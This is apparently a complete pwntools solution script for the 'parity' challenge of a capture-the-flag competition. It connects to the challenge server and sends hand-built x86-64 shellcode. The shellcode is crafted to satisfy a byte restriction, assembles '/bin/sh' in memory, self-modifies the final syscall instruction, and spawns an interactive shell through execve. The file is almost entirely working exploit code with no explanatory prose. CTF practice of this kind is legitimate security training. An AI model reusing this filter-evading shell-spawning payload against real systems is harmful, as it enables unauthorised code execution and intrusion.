from pwn import *

p = remote('challs.actf.co', 31226)
# p = remote('localhost', 7777)
e = context.binary = ELF('./parity')

shellcode = '''
    inc rsi                     /* 48ffc6 */
    push rbx                    /* 53 */
    inc QWORD PTR [rsi+0x71]    /* 48ff4671 */

    xor rax, rax        /* 4831c0 */
    add eax, 0x67       /* 83c067 */
    nop                 /* 90 */
    inc eax             /* ffc0 */
    shl eax, 7          /* c1e007 */
    nop                 /* 90 */
    shl eax, 1          /* d1e0 */

    add eax, 0x73       /* 83c073 */
    nop                 /* 90 */
    shl eax, 7          /* c1e007 */
    nop                 /* 90 */
    shl eax, 1          /* d1e0 */

    add eax, 0x2f       /* 83c02f */
    push rax            /* 50 */
    pop rbx             /* 5b */
    
    xor rax, rax        /* 4831c0 */
    add esi, 1          /* 83c601 */
    mov eax, 0x6e69622f /* b82f62696e */
    add esi, 1          /* 83c601 */
    push rax            /* 50 */
    add esi, 1          /* 83c601 */
    mov rax, rsp        /* 4889e0 */

    add esi, 1          /* 83c601 */
    inc rax             /* 48ffc0 */
    add esi, 1          /* 83c601 */
    inc rax             /* 48ffc0 */
    add esi, 1          /* 83c601 */
    inc rax             /* 48ffc0 */
    add esi, 1          /* 83c601 */
    inc rax             /* 48ffc0 */
    add esi, 1          /* 83c601 */
    nop                 /* 90 */
    mov DWORD PTR [rax], ebx  /* 8918 */

    add esi, 1          /* 83c601 */
    mov rdx, rsp        /* 4889e2 */ 
    push rbx            /* 53 */
    lea rdi, [rdx]      /* 488d3a */

    push rbx            /* 53 */
    xor rsi, rsi        /* 4831f6 */
    push rbx            /* 53 */
    xor rdx, rdx        /* 4831d2 */
    push rbx            /* 53 */
    xor rax, rax        /* 4831c0 */
    add eax, 0x3b       /* 83c03b */
'''
payload = asm(shellcode)
payload += b'\x0e\x05'
p.sendline(payload)
p.interactive()

